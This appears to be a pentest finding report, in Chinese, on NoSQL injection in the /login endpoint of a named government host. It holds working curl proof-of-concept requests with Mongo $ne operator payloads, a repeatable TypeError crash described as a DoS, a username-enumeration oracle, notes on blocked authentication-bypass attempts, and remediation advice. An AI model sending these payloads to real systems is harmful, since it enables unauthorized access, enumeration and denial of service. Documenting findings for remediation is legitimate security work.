# /login NoSQL 注入（username/password 未过滤 Mongo 操作符，403/500 oracle + DoS）

- ID: `61b12da2-1805-42de-9e3c-c1ebeb4ae2b1`
- Severity: **high**
- Status: open
- Type: NoSQL 注入
- Target: `https://epcr.tpf.gov.tw:4004/login (POST, JSON与form-urlencoded, username+password字段)`
- Conversation: `532cedc0-0580-4045-a5e2-45c07c488867`
- Created: 2026-09-06 17:08:36.658703036+08:00

## Description

/login 的 username 与 password 字段未对 Mongo 查询操作符做转义/类型校验，直接拼入 MongoDB find 查询（后端疑似 JQLike，普遍接受 $ 操作符）。JSON 与 form-urlencoded 两种 Content-Type 均可触发。注入后可通过状态码差异（403 vs 500）构造 oracle：403="無法登入的來源"表示查询返回多文档且进入 source 校验；500 "TypeError" 表示查询返回 0/1 文档导致 result[0] 崩溃。可泄露用户名存在性、source 校验逻辑与校验顺序（source 先于密码）。

## Reproduction

1. 获取session: curl -sk -c /tmp/ck.txt 'https://epcr.tpf.gov.tw:4004/captcha' (提取connect.sid cookie)
2. 403 source泄露: curl -sk -b /tmp/ck.txt -X POST 'https://epcr.tpf.gov.tw:4004/login' -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}' → 预期403 "無法登入的來源"
3. 500 DoS: 同URL -d '{"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"}' → 预期500 "TypeError"
4. form变体: -d 'username=&password=&captcha=1&domain=AUTH_SERVER' (form-urlencoded) → 预期500 "TypeError"
5. oracle枚举: 遍历username值, 403=存在(source校验路径), 500=不存在或单文档, 观察差异确认用户名存在性
6. 认证绕过验证: source用$ne/$regex宽泛匹配仍403, 证明source白名单阻挡(白名单值未知)

## Evidence

PoC1(403 source泄露): curl -k -c /tmp/c -X POST 'https://epcr.tpf.gov.tw:4004/login' -H 'Content-Type: application/json' -b "connect.sid=$(curl -sk -c - 'https://epcr.tpf.gov.tw:4004/captcha'|awk '/connect.sid/{print $7}')" -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

PoC2(500 DoS): 同 URL -d '{"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 500 body="TypeError" (Content-Length 9)

PoC3(form-urlencoded): -d 'username=&password=&captcha=1&domain=AUTH_SERVER'
→ HTTP 500 "TypeError"

状态码Oracle矩阵:
- {"$ne":null}+$ne → 403 (多文档, 进source校验)
- "admin"+"x" → 500 (0/1文档, result[0]崩溃)
- form空值 → 500

操作符支持: $ne/$or/$and/$regex/$in/$gt/$where 均被接受(未过滤)
domain参数被完全忽略(28种值全相同403)
source校验在密码校验之前(NoSQL username+精确password仍403)

认证绕过受阻: source字段为硬编码白名单(值未知,非localhost/epcr.tpf.gov.tw/118.163.107.93/35.234.50.28这4个前端whiteListedDomains), 用户文档source值稀疏($and过滤41种值全500≤1文档), 宽泛source匹配($ne/$regex/$or)仍403, 证明白名单值特殊且用户文档source不匹配。

## Impact

1. 信息泄露: 通过403/500 oracle可枚举用户名存在性(存在→403或500, 不存在→500), 推断source校验逻辑与校验顺序(source先于password)。
2. 拒绝服务: 构造使查询返回0/1文档的payload触发result[0] TypeError崩溃(500), 可重复触发造成应用层DoS。
3. 认证绕过(潜在, 当前受阻): 若source白名单值泄露或用户文档source字段被污染, NoSQL注入可绕过密码校验直接获取JWT token; 当前被硬编码source白名单阻挡。
4. 数据读取(潜在): 若后端未限制投影字段, 可通过$ne:$where进一步构造读取MongoDB用户集合字段(密码哈希/角色/2FA密钥)。
5. 扩大攻击面: 后端普遍接受JQLike操作符, 其他接受查询的端点(受JWT保护)可能存在同类注入。

## Recommendation

1. 输入校验: 对username/password强制字符串类型校验, 拒绝对象/数组类型(后端应显式校验typeof==='string')。
2. 操作符转义: 对 $ 开头字段做转义, 或使用MongoDB的$unset/dollar escape, 避免用户输入被解释为查询操作符。
3. 类型安全查询: 使用强类型ORM或明确schema校验(如Joi/zod), 拒绝非预期字段(source等)出现在登录查询中。
4. 错误处理: 修复result[0]未判空的TypeError崩溃, 统一返回401而非500, 消除状态码oracle。
5. source白名单: 若source校验为业务必需, 应文档化白名单值并评估其可枚举性; 考虑改为服务端会话绑定而非用户文档字段。
6. 复测: 修复后PoC1应返回401(非403), PoC2/PoC3应返回401(非500), 且无法通过$操作符改变查询语义。
